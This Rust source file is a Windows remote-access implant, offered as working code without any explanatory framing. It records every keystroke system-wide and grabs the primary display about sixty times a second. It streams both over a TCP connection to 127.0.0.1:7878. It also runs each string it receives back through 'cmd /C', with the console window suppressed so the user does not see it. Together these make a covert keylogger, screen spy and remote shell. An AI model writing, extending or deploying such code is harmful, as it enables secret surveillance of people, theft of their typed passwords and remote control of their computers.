use tokio::io::{self, AsyncReadExt, AsyncWriteExt};
use tokio::sync::mpsc;
use tokio::net::TcpStream;
use tokio::time::Duration;
use std::process::Command;
use std::os::windows::process::CommandExt;
use std::io::ErrorKind::WouldBlock;
use std::thread;
use rdev::{Event, listen};
#[allow(unused)]
use scrap::{Capturer, Display};

#[allow(unused)]
trait ToBeBytes {
    fn as_bytes(&self) -> &[u8];
}

#[allow(unused)]
trait Bytes {
    fn push_str(&mut self, s: &str);
}


impl ToBeBytes for String {
    fn as_bytes(&self) -> &[u8] {
        String::as_bytes(self)
    }
}

impl Bytes for String {
    fn push_str(&mut self, s: &str) {
        String::push_str(self, s);
    }
}

enum Data {
    Keystroke(Vec<u8>),
    Screenshot(Vec<u8>),
}

impl Data {
    fn process(self) -> Vec<u8> {
        match self {
            Data::Keystroke(data) => {
                let mut data = String::from_utf8_lossy(&data).into_owned();
                data.push_str("keystroke_reader");
                data.as_bytes().to_owned()
            }
            Data::Screenshot(data) => {
                let mut data = String::from_utf8_lossy(&data).into_owned();
                data.push_str("screenshot");
                data.as_bytes().to_owned()
            }
        }
    }
}

async fn handle_screenshot(tx: mpsc::Sender<Data>) -> std::io::Result<()> {
    let frame_duration = Duration::from_secs_f32(1.0 / 60.0);

    tokio::task::spawn_blocking(move || {
        let display = Display::primary().map_err(|e| std::io::Error::new(std::io::ErrorKind::Other, e))?;
        let mut capturer = Capturer::new(display).map_err(|e| std::io::Error::new(std::io::ErrorKind::Other, e))?;
        let (w, h) = (capturer.width(), capturer.height());

        loop {
            let buffer = match capturer.frame() {
                Ok(buffer) => buffer,
                Err(error) => {
                    if error.kind() == WouldBlock {
                        thread::sleep(frame_duration);
                        continue;
                    } else {
                        panic!("error: {}", error);
                    }
                }
            };

            let mut bitflipped = Vec::with_capacity(w * h * 4);
            let stride = buffer.len() / h;

            for y in 0..h {
                for x in 0..w {
                    let i = stride * y + 4 * x;
                    bitflipped.extend_from_slice(&[
                        buffer[i + 2],
                        buffer[i + 1],
                        buffer[i],
                        255,
                    ]);
                }
            }

            if tx.blocking_send(Data::Screenshot(bitflipped)).is_err() {
                break;
            }

            std::thread::sleep(frame_duration);
        }

        Ok(())
    })
    .await?
}

#[tokio::main]
async fn main() -> io::Result<()> {
    let socket = TcpStream::connect("127.0.0.1:7878").await?;
    let (mut rd, mut wr) = io::split(socket);
    let (tx, mut rx) = mpsc::channel(16);

    // spawn blocking for reading client keystrokes synchronously
    // crate rdev do not support async
    let tx_clone = tx.clone();
    tokio::task::spawn_blocking( move || {
        let callback = move |event: Event| {
            match event.name {
                Some(string) => {
                    let bytes = string.as_bytes();
                    tx_clone.blocking_send(Data::Keystroke(bytes.to_owned())).expect("cannot send data")
            },
                None => (),
            }
        };

        if let Err(error) = listen(callback) {
            println!("{:?}", error);
        }
    });

    // receiving data from mpsc channel
    // then writing data to tcp stream
    tokio::spawn(async move  {
        while let Some(data) = rx.recv().await {
            wr.write_all(&data.process()).await?;
        }

        Ok::<_, io::Error>(())
    });

    let mut buf = vec![0; 256];

    loop {
        let n = rd.read(&mut buf).await?;

        if n == 0 {
            break;
        }

        let command = std::str::from_utf8(&buf[..n]);
        
        match command {
            Ok(command) => {
                Command::new("cmd")
                    .args(["/C", command])
                    .creation_flags(0x08000000) 
                    .output()
                    .expect("failed to excute command");
            }
            Err(_) => println!("cannot decode bytes to str")
        }
    }

    Ok(())
}
